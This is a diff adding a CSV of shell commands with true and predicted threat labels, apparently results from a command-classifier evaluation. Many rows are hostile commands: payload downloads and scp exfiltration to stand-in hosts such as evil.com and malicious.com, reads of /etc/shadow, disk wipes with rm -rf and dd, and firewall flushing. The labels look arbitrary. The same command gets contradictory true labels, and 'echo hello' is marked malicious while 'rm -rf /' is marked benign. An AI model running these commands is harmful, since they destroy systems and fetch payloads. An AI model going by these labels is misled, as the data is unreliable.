@@ -1,0 +1,4014 @@
+command,true_label,predicted_label
+curl http://unknown.site/script.sh,SUSPICIOUS,BENIGN
+wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
+GREP   'PASSWORD' /ETC/PASSWD,MALICIOUS,BENIGN
+cat /etc/passwd,SUSPICIOUS,BENIGN
+scp data.tar.gz admin@malicious.com:/var/www,SUSPICIOUS,BENIGN
+ifconfig,MALICIOUS,BENIGN
+WHOAMI,SUSPICIOUS,BENIGN
+uname -a,MALICIOUS,BENIGN
+pwd,SUSPICIOUS,BENIGN
+rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
+echo   'hello',SUSPICIOUS,BENIGN
+cat   welcome.txt,SUSPICIOUS,MALICIOUS
+cat /root/.bashrc,SUSPICIOUS,BENIGN
+ping google.com,SUSPICIOUS,BENIGN
+cd /var/www,SUSPICIOUS,BENIGN
+scp data.tar.gz root@malicious.com:/tmp/,MALICIOUS,BENIGN
+env,BENIGN,SUSPICIOUS
+echo 'hacked' >> /var/log/syslog,SUSPICIOUS,BENIGN
+df -h,SUSPICIOUS,BENIGN
+sudo apt install nmap ,BENIGN,MALICIOUS
+wget   http://evil.com/update.bin,SUSPICIOUS,BENIGN
+top -n 1,BENIGN,SUSPICIOUS
+wget http://suspicious.org/update.bin,BENIGN,MALICIOUS
+wget http://evil.com/update.bin,SUSPICIOUS,BENIGN
+curl -O http://evil.com/exploit.zip,MALICIOUS,BENIGN
+cd /root/,MALICIOUS,BENIGN
+ssh -L 8080:target.com:80 attacker@remote,SUSPICIOUS,BENIGN
+cat /etc/shadow,MALICIOUS,BENIGN
+cat .bashrc,SUSPICIOUS,BENIGN
+ps aux,SUSPICIOUS,BENIGN
+ls /root/,MALICIOUS,BENIGN
+WGET HTTP://EVIL.COM/PAYLOAD.SH ,MALICIOUS,BENIGN
+ping   google.com,MALICIOUS,BENIGN
+echo 'hello world',SUSPICIOUS,MALICIOUS
+cat   /etc/shadow,SUSPICIOUS,BENIGN
+echo   'hacked' > /root/.bashrc,MALICIOUS,BENIGN
+mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
+PING GOOGLE.COM ,MALICIOUS,BENIGN
+sudo apt install net-tools,SUSPICIOUS,BENIGN
+which   python,SUSPICIOUS,BENIGN
+curl http://unknown.site/script.sh ,MALICIOUS,BENIGN
+ DF -H,MALICIOUS,BENIGN
+echo 'hello world',MALICIOUS,SUSPICIOUS
+sudo -l,MALICIOUS,BENIGN
+WGET HTTP://FILESHARE.COM/PAYLOAD.SH,SUSPICIOUS,BENIGN
+CAT /ROOT/.BASHRC ,BENIGN,MALICIOUS
+sudo apt update,MALICIOUS,BENIGN
+sudo apt install   net-tools,BENIGN,MALICIOUS
+dd if=/dev/zero of=/dev/sda ,SUSPICIOUS,BENIGN
+echo 'hacked' >> /etc/shadow,MALICIOUS,BENIGN
+cat   /etc/shadow,MALICIOUS,BENIGN
+env,BENIGN,SUSPICIOUS
+sudo apt update,SUSPICIOUS,BENIGN
+echo 'owned' > /etc/shadow,MALICIOUS,BENIGN
+find / -name 'test',BENIGN,MALICIOUS
+cat homework.txt,MALICIOUS,SUSPICIOUS
+ echo 'hacked' > /var/log/syslog,BENIGN,MALICIOUS
+cat .bashrc,SUSPICIOUS,MALICIOUS
+LS   /TMP/,MALICIOUS,BENIGN
+rm -rf /,MALICIOUS,BENIGN
+echo 'malware'   > /tmp/malware.sh,MALICIOUS,BENIGN
+cd /tmp/,SUSPICIOUS,BENIGN
+cat /root/.bashrc,MALICIOUS,BENIGN
+scp data.tar.gz admin@192.168.0.2:/tmp/,SUSPICIOUS,BENIGN
+echo 'owned' > /etc/shadow,SUSPICIOUS,BENIGN
+ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,BENIGN
+uname -a,BENIGN,MALICIOUS
+echo 'pwned' > /root/.bashrc,MALICIOUS,BENIGN
+chmod 777 /var/log/syslog,MALICIOUS,BENIGN
+rm -rf /,MALICIOUS,BENIGN
+ sudo apt install htop,MALICIOUS,BENIGN
+echo 'pwned' >> /etc/shadow ,MALICIOUS,BENIGN
+echo 'hello',SUSPICIOUS,BENIGN
+cat .bashrc,SUSPICIOUS,BENIGN
+chmod 777 /root/.bashrc,MALICIOUS,BENIGN
+cd /var/www,SUSPICIOUS,BENIGN
+cat ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
+ls /tmp/,SUSPICIOUS,BENIGN
+curl -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
+chmod 777 /root/.bashrc,MALICIOUS,SUSPICIOUS
+sudo apt install htop,SUSPICIOUS,BENIGN
+top -n 1,SUSPICIOUS,BENIGN
+echo 'hello',SUSPICIOUS,BENIGN
+pwd,SUSPICIOUS,MALICIOUS
+cd   /root/,SUSPICIOUS,BENIGN
+SUDO SU,SUSPICIOUS,BENIGN
+cat readme.md,SUSPICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,MALICIOUS,BENIGN
+ECHO 'OWNED' > /ROOT/.BASHRC,BENIGN,SUSPICIOUS
+ls /tmp/,BENIGN,SUSPICIOUS
+curl https://safe-site.org/update.sh,SUSPICIOUS,BENIGN
+scp file.txt root@malicious.com:/tmp/,SUSPICIOUS,BENIGN
+cat homework.txt ,MALICIOUS,BENIGN
+cat /root/.bashrc,MALICIOUS,BENIGN
+chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
+wget http://malicious.com/payload.sh,SUSPICIOUS,MALICIOUS
+echo 'hello world' ,MALICIOUS,BENIGN
+cat /var/log/syslog,SUSPICIOUS,BENIGN
+scp data.tar.gz root@192.168.0.2:/tmp/,BENIGN,MALICIOUS
+echo   'owned' >> /root/.bashrc,MALICIOUS,BENIGN
+mkdir test,MALICIOUS,BENIGN
+cat /var/log/syslog,MALICIOUS,SUSPICIOUS
+cat   /etc/shadow,SUSPICIOUS,BENIGN
+cat   /home/user/todo.txt,BENIGN,SUSPICIOUS
+sudo   su,MALICIOUS,BENIGN
+echo 'pwned' >> /root/.bashrc,MALICIOUS,BENIGN
+echo 'pwned' > /etc/shadow,MALICIOUS,BENIGN
+ls -al,SUSPICIOUS,BENIGN
+cd /var/www,BENIGN,MALICIOUS
+ssh -L 8080:target.com:80 attacker@remote,SUSPICIOUS,BENIGN
+sudo su,MALICIOUS,BENIGN
+cat   /home/user/info.txt,SUSPICIOUS,BENIGN
+ps aux | grep nginx ,BENIGN,SUSPICIOUS
+echo 'hello',SUSPICIOUS,MALICIOUS
+chmod 777 /etc/shadow,MALICIOUS,SUSPICIOUS
+cat /etc/passwd,BENIGN,SUSPICIOUS
+ps aux,SUSPICIOUS,BENIGN
+curl https://suspicious.org/update.bin,SUSPICIOUS,BENIGN
+netstat -tulnp,SUSPICIOUS,BENIGN
+echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
+scp file.txt root@192.168.0.2:/var/www,SUSPICIOUS,BENIGN
+ls /root/,MALICIOUS,SUSPICIOUS
+touch homework.doc,SUSPICIOUS,BENIGN
+wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
+curl https://suspicious.org/payload.sh ,SUSPICIOUS,BENIGN
+CAT /ROOT/.BASHRC,MALICIOUS,BENIGN
+env,MALICIOUS,BENIGN
+echo 'owned' >> /var/log/syslog,SUSPICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
+echo 'owned' >> /var/log/syslog,MALICIOUS,BENIGN
+pwd,MALICIOUS,BENIGN
+grep root /etc/passwd,MALICIOUS,SUSPICIOUS
+cat readme.md,SUSPICIOUS,BENIGN
+scp backup.sql root@malicious.com:/var/www,MALICIOUS,BENIGN
+mv /bin/bash /tmp/bash,BENIGN,MALICIOUS
+curl https://fileshare.com/exploit.zip,BENIGN,MALICIOUS
+dd if=/dev/zero of=/dev/sda,MALICIOUS,BENIGN
+uname -a,MALICIOUS,BENIGN
+cd /var/www,MALICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
+find / -name 'test',BENIGN,MALICIOUS
+HISTORY,SUSPICIOUS,BENIGN
+cat   /etc/passwd,SUSPICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
+ CAT /ROOT/.BASHRC,SUSPICIOUS,BENIGN
+uname -a,MALICIOUS,SUSPICIOUS
+RM -RF /,MALICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,MALICIOUS,BENIGN
+ls /root/,SUSPICIOUS,BENIGN
+netstat -tulnp,BENIGN,MALICIOUS
+wget http://fileshare.com/update.bin,SUSPICIOUS,BENIGN
+grep   root /etc/passwd,MALICIOUS,SUSPICIOUS
+wget http://evil.com/update.bin,MALICIOUS,BENIGN
+scp   file.txt user@malicious.com:/var/www,SUSPICIOUS,BENIGN
+SSH -L 8080:TARGET.COM:80 ATTACKER@REMOTE,SUSPICIOUS,BENIGN
+ps aux | grep sshd,MALICIOUS,BENIGN
+rm -rf /,SUSPICIOUS,BENIGN
+echo 'hello   world',MALICIOUS,SUSPICIOUS
+curl   -O http://malicious.com/malware.bin,MALICIOUS,BENIGN
+curl -O http://evil.com/payload.sh,MALICIOUS,BENIGN
+cd /root,BENIGN,SUSPICIOUS
+cat   welcome.txt,MALICIOUS,SUSPICIOUS
+chmod 777 /root/.bashrc,SUSPICIOUS,BENIGN
+curl   -o http://evil.com/payload.sh,SUSPICIOUS,BENIGN
+df -h,MALICIOUS,SUSPICIOUS
+history,SUSPICIOUS,BENIGN
+curl https://evil.com/exploit.zip,MALICIOUS,BENIGN
+cat   /home/user/todo.txt,MALICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
+curl -O http://fileshare.com/payload.sh,BENIGN,MALICIOUS
+CURL HTTP://UNKNOWN.SITE/SCRIPT.SH,SUSPICIOUS,BENIGN
+cat   readme.md,SUSPICIOUS,BENIGN
+curl https://safe-site.org/update.sh,BENIGN,MALICIOUS
+pwd,MALICIOUS,SUSPICIOUS
+cat homework.txt ,MALICIOUS,BENIGN
+UNAME -A,SUSPICIOUS,BENIGN
+curl https://suspicious.org/payload.sh,MALICIOUS,BENIGN
+sudo apt update,MALICIOUS,BENIGN
+ls /root/,MALICIOUS,BENIGN
+cat welcome.txt ,SUSPICIOUS,BENIGN
+cat /etc/shadow,MALICIOUS,SUSPICIOUS
+ls -al,MALICIOUS,BENIGN
+curl   https://suspicious.org/update.bin,SUSPICIOUS,BENIGN
+SUDO APT INSTALL HTOP ,MALICIOUS,BENIGN
+ls   /root/,SUSPICIOUS,BENIGN
+history,MALICIOUS,BENIGN
+which python,SUSPICIOUS,BENIGN
+cat welcome.txt,MALICIOUS,SUSPICIOUS
+sudo su,MALICIOUS,BENIGN
+top -n   1,SUSPICIOUS,BENIGN
+ls   -al,MALICIOUS,SUSPICIOUS
+sudo apt update,MALICIOUS,BENIGN
+chmod 777   /etc/shadow,MALICIOUS,BENIGN
+cat homework.txt,SUSPICIOUS,BENIGN
+cat /home/user/info.txt,SUSPICIOUS,BENIGN
+wget http://malicious.com/payload.sh,MALICIOUS,BENIGN
+echo 'hacked' >> /var/log/syslog,SUSPICIOUS,BENIGN
+ps aux,BENIGN,MALICIOUS
+dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
+uname -a,SUSPICIOUS,MALICIOUS
+curl http://unknown.site/script.sh,SUSPICIOUS,BENIGN
+netstat -tulnp,BENIGN,SUSPICIOUS
+curl http://unknown.site/script.sh,MALICIOUS,BENIGN
+curl -o http://suspicious.org/exploit.zip,MALICIOUS,BENIGN
+df -h,MALICIOUS,SUSPICIOUS
+ECHO 'PWNED' > /ROOT/.BASHRC,MALICIOUS,BENIGN
+ls /tmp/,BENIGN,MALICIOUS
+SUDO -L,SUSPICIOUS,BENIGN
+echo 'hello world',MALICIOUS,BENIGN
+ssh -L 8080:target.com:80 attacker@remote,SUSPICIOUS,BENIGN
+ps aux | grep nginx,BENIGN,MALICIOUS
+ sudo apt install net-tools,SUSPICIOUS,BENIGN
+PWD,SUSPICIOUS,BENIGN
+iptables -F,MALICIOUS,BENIGN
+CAT /VAR/LOG/SYSLOG,SUSPICIOUS,BENIGN
+chmod 777 /root/.bashrc,SUSPICIOUS,MALICIOUS
+ping google.com,SUSPICIOUS,BENIGN
+iptables -F,SUSPICIOUS,BENIGN
+mkdir   test,BENIGN,SUSPICIOUS
+chmod 777 /etc/shadow,BENIGN,SUSPICIOUS
+sudo apt update,MALICIOUS,BENIGN
+ls /root/,MALICIOUS,BENIGN
+uname -a,SUSPICIOUS,BENIGN
+du -sh,SUSPICIOUS,BENIGN
+echo 'hello',SUSPICIOUS,MALICIOUS
+mv /bin/bash /tmp/bash,MALICIOUS,BENIGN
+wget http://suspicious.org/exploit.zip,SUSPICIOUS,BENIGN
+cat /var/log/auth.log,SUSPICIOUS,BENIGN
+ grep 'password' /etc/passwd,MALICIOUS,BENIGN
+df -h,MALICIOUS,BENIGN
+curl https://safe-site.org/update.sh,MALICIOUS,BENIGN
+curl -O http://fileshare.com/payload.sh,BENIGN,MALICIOUS
+curl https://fileshare.com/update.bin,MALICIOUS,BENIGN
+echo 'hacked' >> /root/.bashrc,SUSPICIOUS,BENIGN
+ls /tmp/,SUSPICIOUS,BENIGN
+cat notes.txt,SUSPICIOUS,BENIGN
+ECHO   'MALWARE' > /TMP/MALWARE.SH,MALICIOUS,BENIGN
+chmod 777 /var/log/syslog,SUSPICIOUS,BENIGN
+echo 'pwned' > /etc/shadow,SUSPICIOUS,BENIGN
+cat /var/log/syslog,BENIGN,SUSPICIOUS
+cat /var/log/syslog,MALICIOUS,SUSPICIOUS
+cat /home/user/info.txt,SUSPICIOUS,BENIGN
+ls /root/,MALICIOUS,BENIGN
+cat /var/log/syslog,SUSPICIOUS,BENIGN
+echo 'hacked' > /etc/shadow,BENIGN,MALICIOUS
+cat   welcome.txt,MALICIOUS,BENIGN
+find / -name 'test',SUSPICIOUS,BENIGN
+ping google.com,MALICIOUS,BENIGN
+chmod 777 /etc/shadow,MALICIOUS,BENIGN
+CHMOD   777 /ETC/SHADOW,SUSPICIOUS,BENIGN
+CURL   HTTPS://EVIL.COM/UPDATE.BIN,MALICIOUS,BENIGN
+CAT /VAR/LOG/SYSLOG ,SUSPICIOUS,BENIGN
+ cat /var/log/auth.log,SUSPICIOUS,BENIGN
+mkdir test,MALICIOUS,BENIGN
+mv /bin/bash /tmp/bash,MALICIOUS,BENIGN
+cd /root,SUSPICIOUS,BENIGN
+scp backup.sql user@192.168.0.2:/root/,BENIGN,SUSPICIOUS
+chmod 777 /root/.bashrc,SUSPICIOUS,BENIGN
+wget http://evil.com/payload.sh,SUSPICIOUS,BENIGN
+wget   http://fileshare.com/payload.sh,BENIGN,MALICIOUS
+chmod 777 /etc/shadow,MALICIOUS,BENIGN
+grep 'password' /etc/passwd,BENIGN,SUSPICIOUS
+ cat /home/user/todo.txt,SUSPICIOUS,BENIGN
+cat   notes.txt,SUSPICIOUS,MALICIOUS
+cat .bashrc,SUSPICIOUS,BENIGN
+cat /root/.bashrc,MALICIOUS,BENIGN
+ps aux,MALICIOUS,BENIGN
+df -h,MALICIOUS,SUSPICIOUS
+ls /root/,SUSPICIOUS,BENIGN
+iptables -F,MALICIOUS,SUSPICIOUS
+watch netstat -an,SUSPICIOUS,BENIGN
+curl https://fileshare.com/exploit.zip,SUSPICIOUS,BENIGN
+ cd /root,MALICIOUS,BENIGN
+grep 'password' /etc/passwd,BENIGN,MALICIOUS
+curl http://unknown.site/script.sh,MALICIOUS,BENIGN
+cat /root/.bashrc,MALICIOUS,BENIGN
+sudo apt update,MALICIOUS,BENIGN
+ ps aux,SUSPICIOUS,MALICIOUS
+top -n 1,SUSPICIOUS,BENIGN
+watch netstat -an,MALICIOUS,BENIGN
+watch netstat -an,MALICIOUS,BENIGN
+wget http://malicious.com/payload.sh,MALICIOUS,BENIGN
+cat /home/user/todo.txt,SUSPICIOUS,BENIGN
+curl https://suspicious.org/payload.sh,MALICIOUS,SUSPICIOUS
+which python,MALICIOUS,BENIGN
+grep root /etc/passwd ,MALICIOUS,BENIGN
+mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
+echo 'hello',SUSPICIOUS,MALICIOUS
+echo 'hello',MALICIOUS,BENIGN
+cat /root/.bashrc,SUSPICIOUS,BENIGN
+cd /tmp/,BENIGN,SUSPICIOUS
+ps aux | grep sshd,BENIGN,SUSPICIOUS
+curl https://safe-site.org/update.sh,MALICIOUS,BENIGN
+echo 'owned' > /var/log/syslog,SUSPICIOUS,BENIGN
+echo 'hacked' > /var/log/syslog,SUSPICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,MALICIOUS,BENIGN
+scp file.txt attacker@remote:/tmp/ ,MALICIOUS,BENIGN
+echo 'malware' > /tmp/malware.sh,SUSPICIOUS,BENIGN
+cat readme.md,MALICIOUS,BENIGN
+ifconfig,SUSPICIOUS,BENIGN
+netstat -tulnp,SUSPICIOUS,BENIGN
+cat   notes.txt,BENIGN,MALICIOUS
+curl -O http://fileshare.com/exploit.zip,SUSPICIOUS,BENIGN
+chmod 777 /etc/shadow,MALICIOUS,BENIGN
+curl https://safe-site.org/update.sh,MALICIOUS,BENIGN
+cat /home/user/todo.txt,SUSPICIOUS,BENIGN
+curl -O http://suspicious.org/exploit.zip,MALICIOUS,BENIGN
+echo 'hello',MALICIOUS,BENIGN
+grep 'password' /etc/passwd,SUSPICIOUS,BENIGN
+ping google.com,MALICIOUS,SUSPICIOUS
+wget http://suspicious.org/payload.sh,SUSPICIOUS,BENIGN
+ls -al,MALICIOUS,BENIGN
+cat /root/.bashrc,SUSPICIOUS,BENIGN
+cat welcome.txt,SUSPICIOUS,BENIGN
+ls -al,SUSPICIOUS,BENIGN
+watch netstat -an,MALICIOUS,BENIGN
+ mkdir test,SUSPICIOUS,BENIGN
+cat /home/user/todo.txt,SUSPICIOUS,BENIGN
+curl http://unknown.site/script.sh ,SUSPICIOUS,BENIGN
+cat .bashrc,SUSPICIOUS,BENIGN
+ls /var/www,SUSPICIOUS,BENIGN
+curl https://evil.com/payload.sh,MALICIOUS,BENIGN
+cat /etc/passwd ,SUSPICIOUS,BENIGN
+cd /root/,MALICIOUS,BENIGN
+mv /bin/bash /tmp/bash,MALICIOUS,BENIGN
+touch homework.doc,MALICIOUS,BENIGN
+ mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
+sudo apt install net-tools ,BENIGN,SUSPICIOUS
+RM -RF /HOME/USER,MALICIOUS,BENIGN
+chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
+cat notes.txt,MALICIOUS,BENIGN
+scp file.txt attacker@remote:/tmp/,SUSPICIOUS,BENIGN
+cd /root/,BENIGN,SUSPICIOUS
+rm -rf /home/user,MALICIOUS,SUSPICIOUS
+ curl -o http://fileshare.com/exploit.zip,BENIGN,MALICIOUS
+ps aux | grep mysql,SUSPICIOUS,BENIGN
+ps aux | grep mysql,MALICIOUS,BENIGN
+echo 'hello world',BENIGN,MALICIOUS
+history,SUSPICIOUS,BENIGN
+CAT README.MD,SUSPICIOUS,BENIGN
+history,SUSPICIOUS,BENIGN
+rm -rf /var/,SUSPICIOUS,BENIGN
+cat /etc/passwd,MALICIOUS,BENIGN
+cat /home/user/todo.txt,MALICIOUS,BENIGN
+ cat readme.md,BENIGN,MALICIOUS
+du -sh,MALICIOUS,BENIGN
+curl https://fileshare.com/exploit.zip,SUSPICIOUS,BENIGN
+wget http://evil.com/exploit.zip,MALICIOUS,BENIGN
+curl http://unknown.site/script.sh,SUSPICIOUS,MALICIOUS
+echo 'hacked' >> /var/log/syslog,BENIGN,SUSPICIOUS
+rm -rf /* --no-preserve-root,MALICIOUS,BENIGN
+sudo apt install htop,BENIGN,MALICIOUS
+cat /root/.bashrc,SUSPICIOUS,BENIGN
+rm -rf / ,BENIGN,SUSPICIOUS
+grep 'password' /etc/passwd,BENIGN,MALICIOUS
+echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
+scp backup.sql admin@malicious.com:/var/www,BENIGN,SUSPICIOUS
+ps aux | grep nginx,MALICIOUS,BENIGN
+which python,MALICIOUS,BENIGN
+cat /root/.bashrc,MALICIOUS,BENIGN
+sudo apt update,MALICIOUS,BENIGN
+cat /var/log/syslog ,SUSPICIOUS,BENIGN
+pwd,MALICIOUS,BENIGN
+echo 'hello',SUSPICIOUS,BENIGN
+grep 'password' /etc/passwd,MALICIOUS,BENIGN
+cat notes.txt,SUSPICIOUS,BENIGN
+echo 'owned' > /var/log/syslog,BENIGN,MALICIOUS
+scp data.tar.gz admin@malicious.com:/var/www,MALICIOUS,BENIGN
+cat /etc/shadow,BENIGN,SUSPICIOUS
+ping google.com,BENIGN,SUSPICIOUS
+curl -O http://malicious.com/malware.bin ,SUSPICIOUS,BENIGN
+sudo apt install nmap,MALICIOUS,BENIGN
+ping google.com,SUSPICIOUS,BENIGN
+echo 'hello',MALICIOUS,SUSPICIOUS
+dd if=/dev/zero of=/dev/sda,SUSPICIOUS,BENIGN
+rm -rf /,MALICIOUS,BENIGN
+cat /home/user/todo.txt,SUSPICIOUS,BENIGN
+mv /bin/bash /tmp/bash,SUSPICIOUS,MALICIOUS
+ssh -L 8080:target.com:80 attacker@remote,SUSPICIOUS,BENIGN
+ls /tmp/,MALICIOUS,BENIGN
+curl -O http://fileshare.com/payload.sh,BENIGN,MALICIOUS
+env,MALICIOUS,BENIGN
+cat /etc/passwd,MALICIOUS,BENIGN
+cd /root,SUSPICIOUS,BENIGN
+chmod   777 /etc/shadow,SUSPICIOUS,BENIGN
+curl -O   http://malicious.com/malware.bin,SUSPICIOUS,BENIGN
+curl -O http://fileshare.com/payload.sh,SUSPICIOUS,BENIGN
+cat welcome.txt,SUSPICIOUS,BENIGN
+cd /var/www,MALICIOUS,BENIGN
+curl https://safe-site.org/update.sh,MALICIOUS,BENIGN
+env,MALICIOUS,BENIGN
+env ,MALICIOUS,BENIGN
+rm -rf /var/,MALICIOUS,BENIGN
+ls -al,MALICIOUS,SUSPICIOUS
+echo   'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
+curl https://evil.com/update.bin,BENIGN,MALICIOUS
+watch netstat -an,SUSPICIOUS,BENIGN
+cat homework.txt,SUSPICIOUS,BENIGN
+cd /root,BENIGN,MALICIOUS
+curl -o   http://evil.com/payload.sh,SUSPICIOUS,MALICIOUS
+dd if=/dev/zero of=/dev/sda,MALICIOUS,SUSPICIOUS
+curl -o http://suspicious.org/exploit.zip,SUSPICIOUS,MALICIOUS
+ls -al,MALICIOUS,BENIGN
+RM -RF /VAR/,SUSPICIOUS,BENIGN
+chmod 777 /etc/shadow,BENIGN,MALICIOUS
+cat readme.md,SUSPICIOUS,MALICIOUS
+ssh -L 8080:target.com:80 attacker@remote,MALICIOUS,SUSPICIOUS
+echo 'pwned' >> /root/.bashrc,SUSPICIOUS,BENIGN
+cat /etc/passwd,BENIGN,MALICIOUS
+echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
+iptables -F,MALICIOUS,BENIGN
+IPTABLES -F,SUSPICIOUS,BENIGN
+whoami,MALICIOUS,BENIGN
+rm -rf /var/,MALICIOUS,BENIGN
+cd /root,MALICIOUS,BENIGN
+env,BENIGN,SUSPICIOUS
+chmod   777 /etc/shadow,SUSPICIOUS,BENIGN
+cat /home/user/todo.txt,MALICIOUS,BENIGN
+sudo apt install net-tools,MALICIOUS,BENIGN
+wget http://fileshare.com/payload.sh,SUSPICIOUS,BENIGN
+which python,SUSPICIOUS,BENIGN
+top -n 1,SUSPICIOUS,BENIGN
+pwd,MALICIOUS,SUSPICIOUS
+cat   /home/user/todo.txt,SUSPICIOUS,BENIGN
+DU   -SH,MALICIOUS,BENIGN
+cat /home/user/info.txt,SUSPICIOUS,BENIGN
+mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
+echo 'hello',SUSPICIOUS,BENIGN
+watch netstat -an,BENIGN,SUSPICIOUS
+RM -RF /* --NO-PRESERVE-ROOT ,SUSPICIOUS,MALICIOUS
+cd /root,MALICIOUS,BENIGN
+cat /var/log/syslog,SUSPICIOUS,BENIGN
+ls -al,MALICIOUS,BENIGN
+sudo apt update,SUSPICIOUS,BENIGN
+env,SUSPICIOUS,BENIGN
+curl -O http://evil.com/payload.sh,SUSPICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,MALICIOUS,SUSPICIOUS
+touch homework.doc,SUSPICIOUS,BENIGN
+WHOAMI,MALICIOUS,BENIGN
+mv /bin/bash /tmp/bash,SUSPICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda ,SUSPICIOUS,BENIGN
+df -h,MALICIOUS,BENIGN
+sudo   -l,BENIGN,SUSPICIOUS
+ history,SUSPICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
+ curl https://suspicious.org/exploit.zip,MALICIOUS,BENIGN
+chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
+touch   homework.doc,SUSPICIOUS,BENIGN
+ping   google.com,SUSPICIOUS,BENIGN
+ps aux | grep mysql,SUSPICIOUS,BENIGN
+rm -rf /,MALICIOUS,BENIGN
+cat welcome.txt,SUSPICIOUS,BENIGN
+ping google.com,MALICIOUS,BENIGN
+du   -sh,SUSPICIOUS,BENIGN
+CAT   /HOME/USER/TODO.TXT,SUSPICIOUS,BENIGN
+cat /root/.bashrc,MALICIOUS,BENIGN
+cat /root/.bashrc,BENIGN,SUSPICIOUS
+cat /var/log/syslog,MALICIOUS,BENIGN
+ps aux | grep nginx,SUSPICIOUS,BENIGN
+cat .bashrc,SUSPICIOUS,BENIGN
+mkdir test,MALICIOUS,BENIGN
+chmod 777 /etc/shadow,SUSPICIOUS,BENIGN
+whoami,SUSPICIOUS,BENIGN
+echo 'malware' > /tmp/malware.sh,MALICIOUS,BENIGN
+ps aux | grep nginx,MALICIOUS,BENIGN
+which python,MALICIOUS,BENIGN
+cat   readme.md,SUSPICIOUS,BENIGN
+sudo su,SUSPICIOUS,BENIGN
+ls /var/www,SUSPICIOUS,BENIGN
+cat welcome.txt,SUSPICIOUS,BENIGN
+df -h ,SUSPICIOUS,BENIGN
+LS /ROOT/,BENIGN,MALICIOUS
+wget http://malicious.com/payload.sh,SUSPICIOUS,BENIGN
+cat /home/user/todo.txt,SUSPICIOUS,BENIGN
+curl https://evil.com/exploit.zip,SUSPICIOUS,BENIGN
+sudo apt install nmap,SUSPICIOUS,BENIGN
+cd /var/www,SUSPICIOUS,BENIGN
+chmod 777 /var/log/syslog,SUSPICIOUS,MALICIOUS
+cat /var/log/auth.log,MALICIOUS,BENIGN
+ping google.com,MALICIOUS,BENIGN
+curl -O http://evil.com/payload.sh,BENIGN,SUSPICIOUS
+ ifconfig,MALICIOUS,SUSPICIOUS
+wget   http://fileshare.com/exploit.zip,SUSPICIOUS,BENIGN
+echo 'hello world',MALICIOUS,SUSPICIOUS
+sudo apt update,BENIGN,SUSPICIOUS
+touch   homework.doc,BENIGN,MALICIOUS
+ECHO   'OWNED' >> /VAR/LOG/SYSLOG,MALICIOUS,BENIGN
+curl http://unknown.site/script.sh,MALICIOUS,BENIGN
+echo 'pwned' >> /var/log/syslog,MALICIOUS,BENIGN
+curl -O http://fileshare.com/payload.sh,MALICIOUS,BENIGN
+cat .bashrc,SUSPICIOUS,BENIGN
+iptables -F,SUSPICIOUS,BENIGN
+chmod 777   /var/log/syslog,SUSPICIOUS,BENIGN
+echo 'hacked' >>   /var/log/syslog,SUSPICIOUS,BENIGN
+cat readme.md,MALICIOUS,SUSPICIOUS
+CHMOD 777 /VAR/LOG/SYSLOG,MALICIOUS,BENIGN
+du   -sh,SUSPICIOUS,BENIGN
+cat homework.txt,MALICIOUS,BENIGN
+iptables -F,MALICIOUS,BENIGN
+env,BENIGN,MALICIOUS
+cat /home/user/todo.txt,SUSPICIOUS,BENIGN
+echo 'hacked' > /root/.bashrc,SUSPICIOUS,BENIGN
+cat   /var/log/auth.log,SUSPICIOUS,BENIGN
+cat /root/.bashrc,SUSPICIOUS,BENIGN
+chmod 777 /etc/shadow,MALICIOUS,BENIGN
+touch   homework.doc,SUSPICIOUS,MALICIOUS
+echo   'hacked' > /root/.bashrc,MALICIOUS,BENIGN
+cd /var/www,SUSPICIOUS,BENIGN
+watch netstat -an,SUSPICIOUS,BENIGN
+uname -a,SUSPICIOUS,BENIGN
+cat   /var/log/syslog,BENIGN,MALICIOUS
+curl -O http://suspicious.org/payload.sh,SUSPICIOUS,BENIGN
+echo 'pwned' > /var/log/syslog,MALICIOUS,BENIGN
+cat ~/.ssh/known_hosts,SUSPICIOUS,BENIGN
+sudo -l,BENIGN,SUSPICIOUS
+cat /etc/passwd,MALICIOUS,SUSPICIOUS
+sudo apt   update,MALICIOUS,BENIGN
+wget   http://malicious.com/payload.sh,MALICIOUS,BENIGN
+rm -rf /home/user,MALICIOUS,BENIGN
+ls /root/,MALICIOUS,BENIGN
+ls   /root/,MALICIOUS,BENIGN
+ps aux | grep mysql,SUSPICIOUS,BENIGN
+curl https://fileshare.com/exploit.zip,MALICIOUS,BENIGN
+pwd,SUSPICIOUS,BENIGN
+wget http://suspicious.org/exploit.zip,SUSPICIOUS,BENIGN
+cat /var/log/syslog,MALICIOUS,BENIGN
+curl   https://evil.com/update.bin,MALICIOUS,BENIGN
+WHICH   PYTHON,MALICIOUS,BENIGN
+wget http://evil.com/exploit.zip,MALICIOUS,BENIGN
+echo 'owned' > /var/log/syslog,SUSPICIOUS,BENIGN
+dd if=/dev/zero of=/dev/sda,MALICIOUS,BENIGN
+rm -rf /* --no-preserve-root,SUSPICIOUS,BENIGN
+LS /ROOT/,MALICIOUS,BENIGN
